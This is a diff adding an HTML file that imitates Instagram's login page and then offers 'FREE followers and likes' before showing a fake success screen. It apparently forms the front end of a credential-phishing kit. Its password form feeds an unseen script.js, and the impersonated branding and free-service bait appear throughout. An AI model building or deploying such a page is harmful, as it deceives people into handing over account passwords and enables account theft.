@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Login Page -->
+    <div id="login-page" class="page active">
+        <div class="container">
+            <div class="login-box">
+                <div class="logo">
+                    <h1>Instagram</h1>
+                </div>
+                
+                <form id="login-form">
+                    <div class="form-group">
+                        <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="username">
+                    </div>
+                    
+                    <div class="form-group">
+                        <input type="password" id="password" placeholder="Password" autocomplete="current-password">
+                    </div>
+                    
+                    <button type="button" class="login-button" id="login-btn">Log in</button>
+                    
+                    <div class="divider">
+                        <span>OR</span>
+                    </div>
+                    
+                    <a href="#" class="facebook-login">
+                        <i class="fab fa-facebook-square"></i> Log in with Facebook
+                    </a>
+                    
+                    <div class="forgot-password">
+                        <a href="#">Forgot password?</a>
+                    </div>
+                </form>
+            </div>
+            
+            <div class="signup-box">
+                <p class="signup-text">Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
+            </div>
+            
+            <div class="get-app">
+                <p class="get-app-text">Get the app.</p>
+                <div class="app-store-buttons">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Download on the App Store" class="app-button">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it on Google Play" class="app-button">
+                </div>
+            </div>
+            
+            <div class="footer">
+                <div class="meta-section">
+                    <div class="meta-logo">M</div>
+                    <div class="meta-text">from Meta</div>
+                </div>
+                <div class="footer-copyright">
+                    © 2023 Instagram from Meta
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Selection Page -->
+    <div id="selection-page" class="page">
+        <div class="container">
+            <div class="selection-box">
+                <div class="logo">
+                    <h1>Instagram</h1><br>
+                    <p class="welcome-text">Welcome, <span id="username-display"></span>!</p>
+                    <p class="subtitle">Boost your Instagram presence with FREE followers and likes!</p>
+                </div>
+                
+                <div class="selection-form">
+                    <!-- Post Link Upload -->
+                    <div class="selection-group post-link-group">
+                        <h2 class="selection-heading">
+                            <i class="fas fa-link"></i> Step 1: Upload Your Post Link
+                        </h2>
+                        <div class="post-link-upload">
+                            <div class="upload-area" id="upload-area">
+                                <i class="fas fa-cloud-upload-alt upload-icon"></i>
+                                <h3>Upload Post Link</h3>
+                                <p>Paste your Instagram post link to receive likes</p>
+                                <div class="link-input-container">
+                                    <input type="text" id="post-link" placeholder="https://www.instagram.com/p/..." class="link-input">
+                                    <button type="button" class="paste-btn" id="paste-btn">
+                                        <i class="fas fa-paste"></i> Paste
+                                    </button>
+                                </div>
+                                <div class="upload-hint">
+                                    <i class="fas fa-info-circle"></i>
+                                    <span>Copy the link from your Instagram post and paste it here</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Likes Selection -->
+                    <div class="selection-group">
+                        <h2 class="selection-heading">
+                            <i class="fas fa-heart"></i> Step 2: Choose Likes Amount
+                        </h2>
+                        <p class="free-badge"><i class="fas fa-gift"></i> FREE SERVICE</p>
+                        <div class="selection-description">
+                            <p>Select how many likes you want on your post</p>
+                        </div>
+                        <div class="checkbox-group likes-group">
+                            <label class="checkbox-label">
+                                <input type="checkbox" name="likes" value="300" class="checkbox-input">
+                                <div class="checkbox-custom">
+                                    <div class="checkbox-icon">
+                                        <i class="fas fa-heart"></i>
+                                    </div>
+                                    <span class="checkbox-number">300</span>
+                                    <span class="checkbox-desc">Likes</span>
+                                    <div class="checkbox-badge">
+                                        <i class="fas fa-gift"></i> FREE
+                                    </div>
+                                </div>
+                            </label>
+                            
+                            <label class="checkbox-label">
+                                <input type="checkbox" name="likes" value="500" class="checkbox-input">
+                                <div class="checkbox-custom">
+                                    <div class="checkbox-icon">
+                                        <i class="fas fa-heart"></i>
+                                    </div>
+                                    <span class="checkbox-number">500</span>
+                                    <span class="checkbox-desc">Likes</span>
+                                    <div class="checkbox-badge">
+                                        <i class="fas fa-gift"></i> FREE
+                                    </div>
+                                </div>
+                            </label>
+                            
+                            <label class="checkbox-label">
+                                <input type="checkbox" name="likes" value="1000" class="checkbox-input">
+                                <div class="checkbox-custom">
+                                    <div class="checkbox-icon">
+                                        <i class="fas fa-heart"></i>
+                                    </div>
+                                    <span class="checkbox-number">1000</span>
+                                    <span class="checkbox-desc">Likes</span>
+                                    <div class="checkbox-badge">
+                                        <i class="fas fa-gift"></i> FREE
+                                    </div>
+                                </div>
+                            </label>
+                            
+                            <label class="checkbox-label">
+                                <input type="checkbox" name="likes" value="5000" class="checkbox-input">
+                                <div class="checkbox-custom premium">
+                                    <div class="checkbox-icon">
+                                        <i class="fas fa-crown"></i>
+                                    </div>
+                                    <span class="checkbox-number">5000</span>
+                                    <span class="checkbox-desc">Premium Likes</span>
+                                    <div class="checkbox-badge premium-badge">
+                                        <i class="fas fa-bolt"></i> FAST
+                                    </div>
+                                </div>
+                            </label>
+                        </div>
+                    </div>
+                    
+                    <!-- Followers Selection -->
+                    <div class="selection-group">
+                        <h2 class="selection-heading">
+                            <i class="fas fa-users"></i> Step 3: Choose Followers (Optional)
+                        </h2>
+                        <p class="free-badge"><i class="fas fa-gift"></i> FREE SERVICE</p>
+                        <div class="selection-description">
+                            <p>Select how many followers you want on your profile</p>
+                        </div>
+                        <div class="checkbox-group followers-group">
+                            <label class="checkbox-label">
+                                <input type="checkbox" name="followers" value="300" class="checkbox-input">
+                                <div class="checkbox-custom">
+                                    <div class="checkbox-icon">
+                                        <i class="fas fa-user-plus"></i>
+                                    </div>
+                                    <span class="checkbox-number">300</span>
+                                    <span class="checkbox-desc">Followers</span>
+                                    <div class="checkbox-badge">
+                                        <i class="fas fa-gift"></i> FREE
+                                    </div>
+                                </div>
+                            </label>
+                            
+                            <label class="checkbox-label">
+                                <input type="checkbox" name="followers" value="500" class="checkbox-input">
+                                <div class="checkbox-custom">
+                                    <div class="checkbox-icon">
+                                        <i class="fas fa-user-plus"></i>
+                                    </div>
+                                    <span class="checkbox-number">500</span>
+                                    <span class="checkbox-desc">Followers</span>
+                                    <div class="checkbox-badge">
+                                        <i class="fas fa-gift"></i> FREE
+                                    </div>
+                                </div>
+                            </label>
+                            
+                            <label class="checkbox-label">
+                                <input type="checkbox" name="followers" value="1000" class="checkbox-input">
+                                <div class="checkbox-custom">
+                                    <div class="checkbox-icon">
+                                        <i class="fas fa-user-plus"></i>
+                                    </div>
+                                    <span class="checkbox-number">1000</span>
+                                    <span class="checkbox-desc">Followers</span>
+                                    <div class="checkbox-badge">
+                                        <i class="fas fa-gift"></i> FREE
+                                    </div>
+                                </div>
+                            </label>
+                            
+                            <label class="checkbox-label">
+                                <input type="checkbox" name="followers" value="5000" class="checkbox-input">
+                                <div class="checkbox-custom premium">
+                                    <div class="checkbox-icon">
+                                        <i class="fas fa-crown"></i>
+                                    </div>
+                                    <span class="checkbox-number">5000</span>
+                                    <span class="checkbox-desc">Premium Followers</span>
+                                    <div class="checkbox-badge premium-badge">
+                                        <i class="fas fa-bolt"></i> FAST
+                                    </div>
+                                </div>
+                            </label>
+                        </div>
+                    </div>
+                    
+                    <div class="selection-summary" id="selection-summary">
+                        <div class="summary-header">
+                            <i class="fas fa-clipboard-list"></i>
+                            <h3>Order Summary</h3>
+                        </div>
+                        <div class="summary-content">
+                            <p><i class="fas fa-info-circle"></i> Select options to see your order summary</p>
+                        </div>
+                    </div>
+                    
+                    <button type="button" class="submit-button" id="submit-btn">
+                        <i class="fas fa-paper-plane"></i> SUBMIT REQUEST
+                    </button>
+                    
+                    <div class="back-link">
+                        <a href="#" id="back-to-login"><i class="fas fa-arrow-left"></i> Back to Login</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Page -->
+    <div id="success-page" class="page">
+        <div class="container">
+            <div class="success-box">
+                <div class="success-icon">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                
+                <h1 class="success-title">Request Successfully Received!</h1>
+                
+                <div class="success-details" id="success-details">
+                    <!-- Details will be filled by JavaScript -->
+                </div>
+                
+                <div class="success-message">
+                    <div class="free-message">
+                        <i class="fas fa-gift"></i>
+                        <p>All services are completely FREE! Your followers and likes will be delivered within 24 hours.</p>
+                    </div>
+                </div>
+                
+                <div class="success-actions">
+                    <button class="success-button" id="new-order-btn">
+                        <i class="fas fa-plus"></i> New Request
+                    </button>
+                    <button class="success-button secondary" id="dashboard-btn">
+                        <i class="fas fa-chart-line"></i> View Status
+                    </button>
+                </div>
+                
+                <div class="success-timer">
+                    <p>Returning to menu in <span id="countdown">10</span> seconds...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
